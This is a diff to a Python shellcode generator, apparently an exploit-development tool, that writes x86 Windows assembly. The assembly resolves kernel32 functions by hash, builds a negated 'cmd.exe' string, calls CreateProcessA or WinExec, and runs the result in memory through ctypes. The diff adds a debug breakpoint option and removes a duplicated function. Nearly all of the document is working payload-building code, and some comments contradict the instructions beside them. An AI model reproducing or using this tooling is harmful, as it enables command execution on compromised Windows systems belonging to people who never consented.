@@ -1,3 +1,9 @@
+"""
+Generate custom shellcode payloads.
+
+Author: wh1rl3y
+Date: 2025-07-07
+"""
 import socket, sys
 import ctypes, struct, numpy
 
@@ -193,17 +199,19 @@ def find_kernel32():
         f"  ret                             ;"  #
     )
 
-def resolve_kernel32_functions(exec_function='CreateProcessA', verbose=False):
+def resolve_kernel32_functions(exec_function='CreateProcessA', verbose=False, force_break=False):
     print_info('Resolving Functions in Kernel32:', SUCCESS, 0, True)
     function_list = ["TerminateProcess", 'LoadLibraryA', exec_function]
     resolve_symbols_string = f"resolve_kernel32_funcitons:"
     counter = 0x10
+    if force_break:
+        resolve_symbols_string += f"  int3                        ;"  #   Break on start for debugging !!!! REMOVE BEFORE USE
     for function_name in function_list:
         function_hash = calculate_function_hash(function_name, verbose)
-        resolve_symbols_string += (f"  mov eax, {function_hash} ;"
+        resolve_symbols_string += (f"  push {function_hash} ;"
         f"  call dword ptr [ebp+0x04] ;"
         f"  mov   [ebp+{hex(counter)}], eax ;")
-        counter += 4
+        counter += 0x04
 
     return resolve_symbols_string
 
@@ -323,10 +331,11 @@ def add_negated_value(cmd_hex, verbose):
         f"  push  eax                       ;"  #   Push part of the "cmd.exe" string
     )
 
-def create_command_string(cmd_chunks, count, verbose):
+def create_command_string(cmd_chunks, count, verbose=False, force_break=False):
     print_info('Command String Hex:', SUCCESS, 1, verbose)
     asm = f"create_command_string_{count}:"
-
+    if force_break:
+        asm += f"  int3                        ;"  #   Break on start for debugging !!!! REMOVE BEFORE USE
     for index in range(len(cmd_chunks), 0, -1):
         chunk = cmd_chunks[index-1]
         func = chunk.get('func', 'none')
@@ -365,38 +374,13 @@ def create_process_a(count):
         f"  call dword ptr [ebp+0x18]       ;"  #   Call CreateProcessA
     )
 
-
-def create_process_a(count):
-    return (
-        f"call_createprocessa_{count}:"  #
-        f"  mov   eax, esp                  ;"  # Move ESP to EAX
-        f"  xor   ecx, ecx                  ;"  # NULL ECX
-        f"  mov   cx, 0x390                 ;"  # Move 0x390 to CX
-        f"  sub   eax, ecx                  ;"  # Substract CX from EAX to avoid overwriting the structure later
-        f"  push  eax                       ;"  # Push lpProcessInformation
-        f"  push  edi                       ;"  # Push lpStartupInfo
-        f"  xor   eax, eax                  ;"  # NULL EAX   
-        f"  push  eax                       ;"  # Push lpCurrentDirectory
-        f"  push  eax                       ;"  # Push lpEnvironment
-        f"  push  eax                       ;"  # Push dwCreationFlags
-        f"  inc   eax                       ;"  # Increase EAX, EAX = 0x01 (TRUE)
-        f"  push  eax                       ;"  # Push bInheritHandles
-        f"  dec   eax                       ;"  # NULL EAX
-
-        f"  push  eax                       ;"  # Push lpThreadAttributes
-        f"  push  eax                       ;"  # Push lpProcessAttributes
-        f"  push  ebx                       ;"  # Push lpCommandLine
-        f"  push  eax                       ;"  # Push lpApplicationName
-        f"  call dword ptr [ebp+0x18]       ;"  # Call CreateProcessA
-    )
-
 def exec_win(count):
     return (
-        f"exec_win_{count}:"  #
-        f"  xor   ecx, ecx                  ;"  # NULL ECX
+        f"exec_win_{count}:"                    #
+        f"  xor   eax, eax                  ;"  # NULL ECX
         f"  push  eax                       ;"  # Push uCmdShow
         f"  push  ebx                       ;"  # Push lpCmdLine
-        f"  call dword ptr [ebp+0x18]       ;"  # Call ExecWin
+        f"  call dword ptr [ebp+0x18]       ;"  # Call WinExec
     )
 
 def execute_shellcode(shellcode):
@@ -422,8 +406,7 @@ def execute_shellcode(shellcode):
                                              ctypes.c_int(0),
                                              ctypes.pointer(ctypes.c_int(0)))
 
-    op =ctypes.windll.kernel32.GetLastError()
-
+    
     ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
 
 def generate_python_script(asm_code, path):
